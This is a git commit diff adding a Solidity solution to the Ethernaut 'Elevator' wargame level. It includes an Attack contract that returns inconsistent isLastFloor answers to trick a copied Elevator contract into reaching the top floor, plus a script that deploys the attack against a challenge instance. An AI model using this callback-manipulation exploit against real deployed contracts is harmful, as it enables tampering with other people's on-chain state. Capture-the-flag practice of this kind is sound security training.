577a19bd2818f3653dbf6ba507d18569371ae85b
LouisTsai <q1030176@gmail.com>
2024-01-05 10:52:02 +0800

    feat: complete 11 elevator challenge

--- script/solutions/11-Elevator.s.sol
+++ script/solutions/11-Elevator.s.sol
@@ -5,6 +5,38 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface Building {
+    function isLastFloor(uint) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint public floor;
+
+    function goTo(uint _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+
+contract Attack {
+    address immutable instance;
+    constructor(address addr) payable {
+        instance = addr;
+    }
+    function isLastFloor(uint256 floor) external returns(bool){
+        if(Elevator(instance).floor()==0) return false; 
+        return true;
+    }
+
+    function exploit() external {
+        Elevator(instance).goTo(1);
+    } 
+}
 
 contract ElevatorSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2;
@@ -15,8 +47,8 @@ contract ElevatorSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
+       Attack attack = new Attack(challengeInstance);
+        attack.exploit();
 
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
